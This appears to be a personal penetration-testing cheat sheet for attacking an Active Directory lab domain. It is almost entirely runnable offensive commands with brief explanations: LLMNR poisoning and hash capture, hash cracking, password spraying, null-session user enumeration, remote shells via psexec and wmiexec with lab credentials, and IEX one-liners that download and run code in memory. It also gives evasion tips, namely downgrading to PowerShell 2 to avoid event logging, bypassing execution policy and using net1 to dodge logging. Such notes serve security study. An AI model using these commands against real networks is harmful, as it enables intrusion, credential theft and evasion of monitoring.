[Windows Executables for Pentesting](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_x64)

## Initial Enumeration

#### View DNS Information
```Bash
nslookup ns1.inlanefreight.com
```
Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. #nslookup #dns ^a596be

#### Credential Hunting
```Shell
python3 dehashed.py -q inlanefreight.local -p
```
Hunts for cleartext credentials and password hashes in breach data  ^d2cd3a

#### Identify Hosts
```Bash
sudo tcpdump -i ens224
```
Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host. #tcpdump #sniffing ^4fe8dc

```shell
sudo responder -I ens224 -A
```
Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host. #responder #sniffing #LLMNR #NBT-NS  ^5ff5b0

```Shell
fping -asgq 172.16.5.0/23
```
Performs a ping sweep on the specified network segment from a Linux-based host. ^6967bf #fping ^4c7222

```Shell
sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum
```
Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host ^dbd5b4 #nmap #scanning  ^4271ce

#### Kerbrute - Internal AD Username Enumeration
```Shell
sudo git clone https://github.com/ropnop/kerbrute.git
```
Uses git to clone the kerbrute tool from a Linux-based host. #kerbrute

```Shell
make help
```
Used to list compiling options that are possible with make from a Linux-based host. #kerbrute

```Shell
./kerbrute_linux_amd64
```
Used to test the chosen complied Kebrute binary from a Linux-based host. #kerbrute 

```Shell
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```
Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. #kerbrute

```Shell
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```
Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host. #kerbrute  ^e39752

## LLMNR/NBT-NS Poisoning

#### Starts Responder w/ Default Settings
```shell
responder -I ens224
```
Starts Responder w/ listener on NIC ens224 #responder  ^a8110d

#### Crack captured hashes
```cmd.exe
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist. #hashcat #ntlm #nthashes  ^9d16b8

#### Import Inveigh
```PowerShell
Import-Module .\Inveigh.ps1
```
Using the Import-Module PowerShell cmd-let to import the Windows-based tool Inveigh.ps1. #inveigh #sniffing #ntlm #nthashes  ^39704d

```PowerShell
(Get-Command Invoke-Inveigh).Parameters
```
Used to output many of the options & functionality available with Invoke-Inveigh. Peformed from a Windows-based host. #inveigh #sniffing #ntlm #nthashes 

#### Start Inveigh
```PowerShell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Starts Inveigh on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. ^90378b

```PowerShell
GET NTLMV2UNIQUE
```
Shows unique hashes captured on Inveigh

```PowerShell
GET NTLMV2USERNAMES
```

## File Transfers

```Shell
sudo python3 -m http.server 8001
```
Starts a python web server for quick hosting of files. Performed from a Linux-basd host. #filetransfers

```PowerShell
"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"
```
PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. #filetransfers 

```Shell
impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/
```
Starts a impacket SMB server for quick hosting of a file. Performed from a Windows-based host. #smb #impacket #filetransfers
## Password Spraying

#### Username Generation
```Shell
#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done
```
Bash script used to generate 16,079,616 possible username combinations from a Linux-based host. #usernames #passwordspraying #passwordattacks #bruteforce #bash #passwordpolicy  ^d7b728

#### Password Policies - From Linux
```Shell
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
Checks password policy on SMB
#crackmapexec #passwordspraying #passwordattacks #passwordpolicy  ^c439f9

```Shell
rpcclient -U "" -N 172.16.5.5
```
Opens null session over RPC Client
#rpcclient #nullsession #passwordpolicy #passwordattacks #smb  ^a5741d

```cmd
querydominfo
```
Gets information about the domain over RPC
#rpcclient #domaininfo 

 ```cmd.exe
 getdompwinfo
```
Gets information about the PW policy of the domain over RPC
#rpcclient #passwordpolicy

```Shell
enum4linux -P 172.16.5.5
```
Enumerates PW policy via enum4linux 
#passwordpolicy #passwordattacks #smb #emum4linux^50f71a

```Shell
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
Enumerates PW policy via enum4linux-ng. Also exports the data for documentation and/or further processing.
#enum4linux-ng #passwordpolicy #passwordattacks #smb  ^0d0f44

```Shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
#ldap #passwordpolicy #passwordattacks ^650665

#### Password Policies - From Windows
```cmd.exe
net accounts
```
Used to enumerate the password policy in a Windows domain from a Windows-based host.
#passwordpolicy #passwordattacks ^125f8d

```PowerShell
Import-Module .\PowerView.ps1
```
Uses the Import-Module cmd-let to import the PowerView.ps1 tool from a Windows-based host.
#passwordpolicy #passwordattacks #powerview

```PowerShell
Get-DomainPolicy
```
Used to enumerate the password policy in a target Windows domain from a Windows-based hos
#passwordpolicy #passwordattacks #powerview  ^c38bba


### Making a Targeted User List

```Shell
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host.
#enum4linux #smb #usernames  ^8db1ef

```Shell
rpcclient -U "" -N 172.16.5.5
```
Opens null session over RPC Client
#rpcclient #nullsession #passwordpolicy #passwordattacks #smb 

```cmd.exe
enumdomusers
```
Finds users on SMB w/ RPC Client
#rpcclient #usernames #smb  ^a89869

```Shell
crackmapexec smb 172.16.5.5 --users
```
Enumerates users on crackmapexec. May also show last time they attempted an unsuccessful password. 
#usernames #smb #crackmapexec  ^946e52

```Shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host. #ldap #usernames  ^420b4e

```Shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host.
#usernames #windapsearch ^d15dcb

```Shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
Username enumeration with Kerbrute tool and jsmith.txt wordlist. 
#kerbrute #usernames  ^0bd10c

```Shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | grep USERNAME: | cut -f8 -d" " | cut -f9 -d" "
```
Username enumeration with Kerbrute tool and jsmith.txt wordlist. Includes filter to only display the usernames.
#kerbrute #usernames  ^49ed22

```Shell
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
Username enumeration with crackmapexec from a credentialed account.
#crackmapexec #usernames  ^5401c4


### Password Spraying - Linux

```Shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
Bash 1-liner password spraying attack w/ RPC against targeted domain.
#rpcclient #passwordattacks #passwordspraying  ^559b1d

```Shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
Password spraying attack with Kerbrute.
#kerbrute #passwordattacks #passwordspraying  ^f6277b

```Shell
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
Password spraying attack w/ CrackMapExec. "+" ensures only valid credentials are displayed.
#crackmapexec #passwordattacks #passwordspraying  ^bc94f9

```Shell
crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
Login w/ credentials on CrackMapExec.
#access #crackmapexec 

#### Local Admin Spraying with CrackMapExec
```Shell
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
Checks across all domains to see if the administrator's password has been used anywhere else
#crackmapexec #passwordattacks #passwordspraying  ^56d64d

### Password Spraying - Windows
```PowerShell
Import-Module .\DomainPasswordSpray.ps1
```
Used to import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host.
#passwordattacks #passwordspraying #powershell

```PowerShell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
#passwordattacks #passwordspraying #powershell  ^9284b4

## Accessed Enumeration
### Enumerating Security Controls from PowerShell

#### Check the Status of Defender
```PowerShell
Get-MpComputerStatus
```
PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.
#enumeration #powershell #defender #antivirus ^b83bc1

#### Check the Status of AppLocker
```PowerShell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
#AppLocker #enumeration #powershell  ^e1f1d4

#### Check the Status of PowerShell Language Mode
```PowerShell
$ExecutionContext.SessionState.LanguageMode
```
PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.
#enumeration #powershell  ^97f25e

#### Check the Status of LAPS
```PowerShell
Find-LAPSDelegatedGroups
```
A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host. Checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
#enumeration #powershell #laps #groups ^b49c78

```PowerShell
Find-AdmPwdExtendedRights
```
A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.
#enumeration #powershell #laps #groups #usernames 

```PowerShell
Get-LAPSComputers
```
A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.
#enumeration #powershell #laps #passwords 


### Enumerating Security Controls from Linux

#### CME - Domain User Enumeration
```Shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (--users) in a target Windows domain. Performed from a Linux-based host.
#smb #crackmapexec #usernames 

#### CME - Domain Group Enumeration
```Shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
Authenticates with a Windows target over smb using valid credentials and attempts to discover groups (--groups) in a target Windows domain. Performed from a Linux-based host.
#smb #crackmapexec #groups 

#### CME - Logged On Users
```Shell
crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users
```
Authenticates with a Windows target over smb using valid credentials and attempts to check for a list of logged on users (--loggedon-users) on the target Windows host. Performed from a Linux-based host.
#crackmapexec #smb #usernames  ^da469f

#### CME Share Enumeration - (Domain Controller)
```Shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
Authenticates with a Windows target over smb using valid credentials and attempts to discover any smb shares (--shares). Performed from a Linux-based host.
#crackmapexec #smb #shares

#### Spider_plus
```Shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
```
Authenticates with a Windows target over smb using valid credentials and utilizes the CrackMapExec module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON. Performed from a Linux-based host.
#crackmapexec #smb #shares 

#### SMBMap To Check Access
```Shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (-H). Performed from a Linux-based host.
#smb #smbmap #shares #permissions  ^22ba76

#### Recursive List Of All Directories
```Shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
```
Enumerates the target Windows domain using valid credentials and performs a recursive listing (-R) of the specified share (SYSVOL) and only outputs a list of directories (--dir-only) in the share. Performed from a Linux-based host.
#sysvol #smbmap #shares #directories #smb 

#### RPCClient User Enumeration By RID
```cmd.exe
queryuser 0x457
```
Enumerates a target user account in a Windows domain using its relative identifier (0x457). Performed from a Linux-based host using RPC Client.
#rpcclient #enumeration #usernames 

#### Enumdomusers
```cmd.exe
enumdomusers
```
Discovers user accounts in a target Windows domain and their associated relative identifiers (rid). Performed from a Linux-based host using RPC Client.
#rpcclient #enumeration #usernames 

#### Access with psexec.py
```Shell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
Impacket tool used to connect to the CLI of a Windows target via the ADMIN$ administrative share with valid credentials. Performed from a Linux-based host.
#impacket #psexec #access #shares  ^df47e4

#### Access with wmiexec.py
```Shell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
Impacket tool used to connect to the CLI of a Windows target via WMI with valid credentials. Performed from a Linux-based host.
#impacket #wmiexec #access  ^32ec95

#### Windapsearch - Domain Admins
```Shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da
```
Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.
#windapsearch #groups #enumeration 

#### Windapsearch - Privileged Users
```Shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU
```
#windapsearch #permissions #enumeration 

#### Execute BloodHound.py
```Shell
bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (-ns) and target Windows domain (inlanefreight.local) as well as runs all checks (-c all). Runs using valid credentials. Performed from a Linux-based host.
#bloodhound #enumeration 


### Enumerating Security Controls from Windows

#### Discover Modules
```PowerShell
Get-Module
```
Lists all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run Import-Module ActiveDirectory to load it for use.
#modules #enumeration #powershell  ^1d778d

#### Load ActiveDirectory Module
```PowerShell
Import-Module ActiveDirectory
```
Imports the Active Directory module if not listed in "Get-Module" initially.
#modules #powershell 

#### Get Domain Info
```PowerShell
Get-ADDomain
```
Displays helpful information like the domain SID, domain functional level, any child domains, and more.
#sid #domaininfo #powershell #enumeration 

#### Get-ADUser
```PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
Filters for accounts with "ServerPrincipalName" which may come in handy for Kerberoasting attacks
#spn #kerberoasting #serviceprincipalname #usernames #powershell #enumeration  ^5c1b55

#### Check For Trust Relationships
```PowerShell
Get-ADTrust -Filter *
```
Verifies domain trust relationships. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts.
#trusts #domaininfo #enumeration 

#### Group Enumeration
```PowerShell
Get-ADGroup -Filter * | select name
```
Provides a list of groups within the domain
#powershell #groups #enumeration 

#### Detailed Group Info
```PowerShell
Get-ADGroup -Identity "Backup Operators"
```
Provides more information about a group of interest
#enumeration #powershell #groups 

#### Group Membership
```PowerShell
Get-ADGroupMember -Identity "Backup Operators"
```
Provides a member list of users in the group of interest
#enumeration #usernames #powershell #groups

#### Get Domain User Information
```PowerShell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
Provides information about a specific user (mmorgan)
#enumeration #usernames #powershell #groups

#### Recursive Group Memberhip Informaiton

```PowerShell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
Performs a recursive look at the Domain Admins group to list its members
#enumeration #usernames #powershell #groups #domaininfo #admin 

#### Trust Enumeration
```PowerShell
Get-DomainTrustMapping
```
Enumerates all trusts for the current domain and any others seen.
#enumeration #usernames #powershell #domaininfo

#### Test for Local Admin Access
```PowerShell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
Tests for local admin access on a specified computer
#enumeration #usernames #powershell #domaininfo #computers #admin

#### Find Users with SPN Set
```PowerShell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
Finds users w/ SPN attribute set (good for Kerberoasting attacks)
#enumeration #kerberoasting #spn #serviceprincipalname #usernames #domaininfo  ^280ec6

#### Find Users with SPN Set
```PowerShell
\SharpView.exe Get-DomainUser -Identity forend
```
Finds users w/ SPN set
#sharpview #enumeration #usernames #domaininfo 

```Shell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
Executes Snaffler from Linux, a tool that can help us acquire credentials or other sensitive data in an Active Directory environment
#snaffler #enumeration #passwords #credentials 

```PowerShell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```
Executes Snaffler on Windows
#snaffler #enumeration #passwords #credentials 

```PowerShell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```
Executes SharpHound, which is the Windows equivalent of Bloodhound
#sharphound #bloodhound #enumeration 

## PowerView

```PowerShell
Export-PowerViewCSV
```
Append results to a CSV file
#enumeration 

```PowerShell
ConvertTo-SID
```
Convert a User or group name to its SID value
#sid #usernames #groups 

```PowerShell
Get-DomainSPNTicket
```
#kerberoasting #spn #serviceprincipalname #enumeration ^9f605f


### Domain/LDAP Functions

```PowerShell
Get-Domain
```
Will return the AD object for the current (or specified) domain
#domaininfo #enumeration

```PowerShell
Get-DomainController
```
Return a list of the Domain Controllers for the specified domain.
#domaininfo #domaincontroller #enumeration 

```PowerShell
Get-DomainUser
```
Will return all users or specific user objects in AD
#usernames #enumeration 

```PowerShell
Get-DomainComputer
```
Will return all computers or specific computer objects in AD
#computers #enumeration 

```PowerShell
Get-DomainGroup
```
Will return all groups or specific group objects in AD
#groups #enumeration 

```PowerShell
Get-DomainOU
```
Search for all or specific OU objects in AD
#enumeration #organizationalunits

```PowerShell
Find-InterestingDomainAcl
```
Finds object ACLs in the domain with modification rights set to non-built in objects
#acls #enumeration 

```PowerShell
Get-DomainGroupMember
```
Will return the members of a specific domain group
#enumeration #groups #usernames 

```PowerShell
Get-DomainFileServer
```
Returns a list of servers likely functioning as file servers
#servers #enumeration #domaininfo 

```PowerShell
Get-DomainDFSShare
```
Returns a list of all distributed file systems for the current (or specified) domain
#enumeration #domaininfo 


### GPO Functions

```PowerShell
Get-DomainGPO
```
Will return all GPOs or specific GPO objects in AD
#gpo #groups #enumeration 

```PowerShell
Get-DomainPolicy
```
Returns the default domain policy or the domain controller policy for the current domain
#policies #domaininfo #domaincontroller #enumeration 


### Computer Enumeration Functions

```PowerShell
Get-NetLocalGroup
```
Enumerates local groups on the local or a remote machine
#groups #enumeration 

```PowerShell
Get-NetLocalGroupMember
```
Enumerates members of a specific local group
#groups #enumeraton

```PowerShell
Get-NetShare
```
Returns open shares on the local (or a remote) machine
#shares #enumeration

```PowerShell
Get-NetSession
```
Will return session information for the local (or a remote) machine
#network #enumeration

```PowerShell
Test-AdminAccess
```
Tests if the current user has administrative access to the local (or a remote) machine
#admin #enumeration 


### Threaded 'Meta'-Functions

```PowerShell
Find-DomainUserLocation
```
Finds machines where specific users are logged in
#enumeration #usernames #computers 

```PowerShell
Find-DomainShare
```
Finds reachable shares on domain machines
#shares #enumeration

```PowerShell
Find-InterestingDomainShareFile
```
Searches for files matching specific criteria on readable shares in the domain
#shares #domaininfo #enumeration 

```PowerShell
Find-LocalAdminAccess
```
Find machines on the local domain where the current user has local administrator access
#admin #enumeration 


### Domain Trust Functions

```PowerShell
Get-DomainTrust
```
Returns domain trusts for the current domain or a specified domain
#trusts #domaininfo #enumeration 

```PowerShell
Get-ForestTrust
```
Returns all forest trusts for the current forest or a specified forest
#trusts #forests #enumeration #domaininfo 

```PowerShell
Get-DomainForeignUser
```
Enumerates users who are in groups outside of the user's domain
#usernames #domaininfo #enumeration 

```PowerShell
Get-DomainForeignGroupMember
```
Enumerates groups with users outside of the group's domain and returns each foreign member
#groups #usernames #domaininfo 

```PowerShell
Get-DomainTrustMapping
```
Will enumerate all trusts for the current domain and any others seen.
#trusts #enumeration #domaininfo 


### Custom Commands

#### Domain User Information
```PowerShell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
Provides information about a specific user, specifically including certain properties of interest
#usernames #enumeration 

#### Recursive Group Membership
```PowerShell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
Retrieves specific domain information. Adding the "-Recurse" switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups.
#groups #domaininfo #enumeration 

#### Trust Enumeration
```PowerShell
Get-DomainTrustMapping
```
Enumerates Domain Trust mappings
#trusts #domaininfo #enumeration 

#### Test for Local Admin Access
```PowerShell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
Tests for local admin access on either the current machine or a remote one.
#admin #computers #enumeration 

#### Find Users with SPN Set
```PowerShell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
Finds users w/ SPN attribute set (good for Kerberoasting attacks)
#kerberoasting #usernames #spn #serviceprincipalname #enumeration  ^e9eeaf
## Bloodhound

### From Linux

#### Scrape Domain with Bloodhound
```Shell
sudo bloodhound-python -u 'BR086' -p 'Welcome1' -ns 172.16.7.3 -d inlanefreight.local -c all
```
Scrapes data from the domain and saves them as files that can be uploaded to GUI

#### Start Bloodhound GUI
```Shell
sudo neo4j start
```
Starts neo4j which allows Bloodhound GUI to access database

```Shell
bloodhound
```
Starts the Bloodhound GUI in Linux

### Queries

`Find Computers with Unsupported Operating Systems`
Finds outdated and unsupported operating systems running legacy software.

`Find Computers where Domain Users are Local Admin`
See if there are any hosts where all users have local admin rights

## Living off the Land

#### PowerShell Help
```PowerShell
Get-Help <yourHelpItem> -ShowWindow
```

#### Basic Enumeration Commands

```PowerShell
hostname
```
Prints the PC's Name
#computers #enumeration ^77c457

```PowerShell
 [System.Environment]::OSVersion.Version
```
Prints out the OS version and revision level
#operatingsystem #version #enumeration  ^e4a604

```PowerShell
wmic qfe get Caption,Description,HotFixID,InstalledOn 
```
Prints the patches and hotfixes applied to the host
#patches #hotfixes #enumeration  ^96a66f

```PowerShell
ipconfig /all
```
Prints out network adapter state and configurations
#network #enumeration  ^402587

```cmd.exe
set %USERDOMAIN%
```
Displays the domain name to which the host belongs (ran from CMD-prompt)
#domaininfo #enumeration ^030507

```cmd.exe
set %logonserver%
```
Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
#domaininfo #domaincontroller #enumeration  ^f2a198

```cmd.exe
systeminfo
```
Prints out all the information which would provided by the previous six commands. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.
#domaininfo #domaincontroller #network #patches #hotfixes #operatingsystem #version #enumeration  ^c8f210


#### Quick Checks in Powershell

```PowerShell
Get-Module
```
Lists available modules loaded for use. 
#modules #enumeration^2f579a

```PowerShell
Get-ExecutionPolicy -List
```
Will print the execution policy settings for each scope on a host.
#policies #enumeration  ^9bd254

```PowerShell
Set-ExecutionPolicy Bypass -Scope Process
```
This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
#policies #enumeration ^879773

```PowerShell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
#history #passwords #files #scripts #enumeration ^d12abc

```PowerShell
Get-ChildItem Env: | ft Key,Value
```
Return environment values such as key paths, users, computer information, etc.
#path #usernames #computers #domaininfo #enumeration ^1ad28a

```PowerShell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 
```
This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
#filetransfers 


#### Downgrade PowerShell

```PowerShell
Get-host
```
Checks version of PowerShell
#version #enumeration 

```PowerShell
powershell.exe -version 2
```
Downgrades to version 2. Older versions are a great way to remain under the radar, as they don't feature event logging. ^592857


#### Checking Defenses

```PowerShell
netsh advfirewall show allprofiles
```
Checks Firewall
#firewall #enumeration   ^87aa24

```cmd.exe
sc query windefend
```
Checks Windows Defender (from CMD.exe)
#defender #enumeration  ^19d9bb

```PowerShell
Get-MpComputerStatus
```
Checks the status and configuration settings
#defender #enumeration  ^19d9bb

```PowerShell
qwinsta
```
Checks to see if any other hosts are logged into the computer
#usernames #domaininfo #enumeration  ^dd0292


#### Network Information

```PowerShell
arp -a
```
Lists all known hosts stored in the arp table.
#arp #hosts #domaininfo #enumeration  ^0ef167

```PowerShell
ipconfig /all
```
Prints out adapter settings for the host. We can figure out the network segment from here.
#network #enumeration  ^942c4f

```PowerShell
route print 
```
Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. ^f1271b
#network #enumeration 

```PowerShell
netsh advfirewall show state
```
Displays the status of the host's firewall. We can determine if it is active and filtering traffic. ^ea9b8d
#firewall #enumeration 


#### Windows Management Instrumentation (WMI) Commands

```PowerShell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
Prints the patch level and description of the Hotfixes applied
#hotfixes #patches #enumeration #enumeration  ^434c7a

```PowerShell
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 
```
Displays basic host information to include any attributes within the list
#domaininfo #computers #usernames #enumeration  ^ba1a77

```PowerShell
wmic process list /format:list
```
A listing of all processes on host
#processes #enumeration  ^df8f4b

```PowerShell
wmic ntdomain list /format:list
```
Displays information about the Domain and Domain Controllers
#domaininfo #domaincontroller #enumeration  ^34e9af

```PowerShell
wmic useraccount list /format:list
```
Displays information about all local accounts and any domain accounts that have logged into the device
#usernames #enumeration  ^34b277

```PowerShell
wmic group list /format:list
```
Information about all local groups
#groups  ^0a1df0

```PowerShell
wmic sysaccount list /format:list
```
Dumps information about any system accounts that are being used as service accounts.
#usernames #domaininfo #enumeration  ^b33314

```PowerShell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```
Provides information about the domain and the child domain, and the external forest that our current domain has a trust with.
#domaininfo #domaincontroller #forests #trusts  ^7b1ac9


#### Net Commands

*Try "net1" instead of "net" if logging is occurring*

```PowerShell
net accounts
```
Information about password requirements
#usernames #passwordpolicy #enumeration  ^f7b3ee

```PowerShell
net accounts /domain
```
Password and lockout policy 
#passwordpolicy #enumeration ^f7b3ee

```PowerShell
net group /domain
```
Information about domain groups
#groups #domaininfo #enumeration  ^6775ae

```PowerShell
net group "Domain Admins" /domain
```
List users with domain admin privileges
#admin #domaininfo #usernames #groups #enumeration  ^3177d9

```PowerShell
net group "domain computers" /domain
```
List of PCs connected to the domain
#computers #enumeration  ^5e06f8

```PowerShell
net group "Domain Controllers" /domain
```
List PC accounts of domains controllers
#domaininfo #domaincontroller #computers #enumeration  ^c6586f

```PowerShell
net group <domain_group_name> /domain
```
User that belongs to the group
#usernames #groups #enumeration  ^2c3c18

```PowerShell
net groups /domain
```
List of domain groups
#groups  #enumeration #domaininfo  ^419181

```PowerShell
net localgroup
```
All available groups 
#groups #enumeration ^419181

```PowerShell
net localgroup administrators /domain
```
List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
#admin #groups #enumeration ^c8286e

```PowerShell
net localgroup Administrators
```
Information about a group (admins)
#groups #admin #enumeration ^419181

```PowerShell
net localgroup administrators [username] /add
```
Add user to administrators
#admin 

```PowerShell
net share
```
Check current shares
#shares #enumeration  ^d81bfa

```PowerShell
net user <ACCOUNT_NAME> /domain
```
Get information about a user within the domain
#usernames #enumeration  ^12164d

```PowerShell
net user /domain
```
List all users of the domain
#usernames #domaininfo #enumeration  ^733c8c

```PowerShell
net user /domain <user>
```
Get information about a Domain User
#usernames #enumeration ^12164d

```PowerShell
net user %username%
```
Information about the current user
#usernames #enumeration ^12164d

```PowerShell
net use x: \computer\share 
```
Mount the share locally
#shares #mount

```PowerShell
net view
```
Get a list of computers
#computers #enumeration  ^f7193a

```PowerShell
net view /all /domain[:domainname] 
```
Shares on the domains 
#shares #enumeration  ^808aa6

```PowerShell
net view \computer /ALL 
```
List shares of a computer
#shares #computers #enumeration ^808aa6

```PowerShell
net view /domain
```
List of PCs of the domain
#computers #enumeration #domaininfo  ^d4cde0


#### Dsquery DLL

```PowerShell
dsquery user
```
#usernames #enumeration

```PowerShell
dsquery computer
```
#computers #enumeration ^e9c454

```PowerShell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
View all objects in an OU
#organizationalunits #domaininfo #enumeration 

```PowerShell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
Queries users with specific attributes (PASSWD_NOTREQD)
#usernames #passwords #passwordattacks #passwordspraying #enumeration  ^7f6950

```PowerShell
